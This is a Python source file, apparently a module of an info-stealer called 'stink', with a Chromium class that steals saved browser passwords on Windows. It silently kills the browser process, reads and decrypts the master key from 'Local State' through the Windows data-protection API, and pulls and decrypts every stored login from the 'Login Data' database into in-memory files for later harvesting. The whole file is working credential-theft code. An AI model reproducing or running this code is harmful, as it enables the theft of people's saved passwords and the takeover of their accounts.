from base64 import b64decode
from ctypes import windll, byref, cdll, c_buffer
from json import loads
from os import path, listdir
from re import compile
from sqlite3 import connect, Connection, Cursor
from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
from typing import Tuple, List

from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
from stink.helpers.config import ChromiumConfig


class Chromium:
    """
    Collects data from the browser.
    """

    def __init__(
            self, browser_name: str, browser_path: str, process_name: str
    ):
        self.__browser_name = browser_name
        self.__state_path = path.join(browser_path, "Local State")
        self.__browser_path = browser_path
        self.__process_name = process_name
        self.__profiles = None

        self.__storage = MemoryStorage()
        self.__config = ChromiumConfig()
        self.__path = path.join("Browsers", self.__browser_name)

    def _kill_process(self):
        """
        Kills browser process.

        Parameters:
        - None.

        Returns:
        - None.
        """
        run(
            f"taskkill /f /im {self.__process_name}",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE,
        )

    def _get_profiles(self) -> List:
        """
        Collects all browser profiles.

        Parameters:
        - None.

        Returns:
        - list: List of all browser profiles.
        """
        pattern = compile(r"Default|Profile \d+")
        profiles = sum(
            [pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], []
        )
        profile_paths = [
            path.join(self.__browser_path, profile) for profile in profiles
        ]

        if profile_paths:
            return profile_paths

        return [self.__browser_path]

    def _check_paths(self) -> None:
        """
        Checks if a browser is installed and if data collection from it is enabled.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__browser_path):
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(
            encrypted_bytes: b64decode, entropy: bytes = b""
    ) -> bytes:
        """
        Decrypts data previously encrypted using Windows CryptProtectData function.

        Parameters:
        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
        - entropy [bytes]: Optional entropy to provide additional security during decryption.

        Returns:
        - bytes: Decrypted data as bytes.
        """
        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(
                byref(
                    DataBlob(
                        len(encrypted_bytes),
                        c_buffer(encrypted_bytes, len(encrypted_bytes)),
                    )
                ),
                None,
                byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
                None,
                None,
                0x01,
                byref(blob),
        ):
            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self) -> bytes:
        """
        Receives the decryption key.

        Parameters:
        - None.

        Returns:
        - bytes: Decryption key.
        """
        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(
            b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:]
        )

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes) -> str:
        """
        Decrypts the value with the master key.

        Parameters:
        - value [bytes]: The value to be decrypted.
        - master_key [bytes]: Decryption key.

        Returns:
        - str: Decrypted string.
        """
        try:
            return (
                AESModeOfOperationGCM(master_key, value[3:15])
                .decrypt(value[15:])[:-16]
                .decode()
            )
        except:
            return "Can't decode"

    @staticmethod
    def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
        """
        Creates a connection with the database.

        Parameters:
        - database [str]: Path to database.

        Returns:
        - tuple: Cursor and Connection objects.
        """
        connection = connect(
            f"file:{database}?mode=ro&immutable=1",
            uri=True,
            isolation_level=None,
            check_same_thread=False,
        )
        cursor = connection.cursor()

        return cursor, connection

    @staticmethod
    def _get_file(file_path: str) -> str:
        """
        Reads the file contents.

        Parameters:
        - file_path [str]: Path to file.

        Returns:
        - str: File content.
        """
        with open(file_path, "r", encoding="utf-8") as file:
            data = file.read()

        return data

    def _grab_passwords(self, profile: str, file_path: str) -> None:
        """
        Collects browser passwords.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            return

        cursor, connection = self._get_db_connection(file_path)
        passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()

        cursor.close()
        connection.close()

        if not passwords_list:
            return

        data = self.__config.PasswordsData
        temp = [
            data.format(
                result[0], result[1], self._decrypt(result[2], self.__master_key)
            )
            for result in passwords_list
        ]

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Passwords.txt"),
            "".join(item for item in set(temp)),
        )

    def _process_profile(self, profile: str) -> None:
        """
        Collects browser profile data.

        Parameters:
        - profile [str]: Browser profile.

        Returns:
        - None.
        """
        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "method": self._grab_passwords,
                "arguments": [profile_name, path.join(profile, "Login Data")],
            },
        ]

        for function in functions:
            try:
                function["method"](*function["arguments"])

            except Exception as e:
                print(f"[{self.__browser_name}]: {repr(e)}")

    def _check_profiles(self) -> None:
        """
        Collects data for each browser profile.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__profiles:
            return

        self.__master_key = self._get_key()

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self) -> List:
        """
        Launches the browser data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            self._kill_process()
            self._check_paths()
            self._check_profiles()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[{self.__browser_name}]: {repr(e)}")
